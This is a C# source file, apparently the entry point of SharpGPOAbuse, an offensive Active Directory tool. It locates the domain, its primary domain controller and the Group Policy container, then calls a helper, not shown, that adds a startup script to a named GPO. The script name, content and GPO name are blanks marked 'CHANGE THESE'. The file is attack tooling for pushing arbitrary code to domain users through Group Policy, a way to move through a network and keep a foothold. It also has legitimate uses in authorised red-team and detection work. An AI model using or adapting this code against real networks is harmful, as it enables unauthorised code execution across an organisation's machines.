using System;
using System.DirectoryServices.ActiveDirectory;

namespace SharpGPOAbuse
{
    class Program
    {
        static void Main(string[] args)
        {
            // CHANGE THESE
            string ScriptName = "";
            string ScriptContent = "";
            string GPOName = "";

            try
            {
                Domain currentDomain = Domain.GetCurrentDomain();
                string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
                string DomainName = currentDomain.Name.ToLower();

                string[] DCs;
                string DistinguishedName = "CN=Policies,CN=System";

                DCs = DomainName.Split('.');

                foreach (string DC in DCs)
                {
                    DistinguishedName += ",DC=" + DC;
                }

                Console.WriteLine($"[+] Domain = {DomainName}");
                Console.WriteLine($"[+] Domain Controller = {DomainController}");
                Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");

                // CHANGE THIS
                StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[!] {0}", e.Message);
            }
        }
    }
}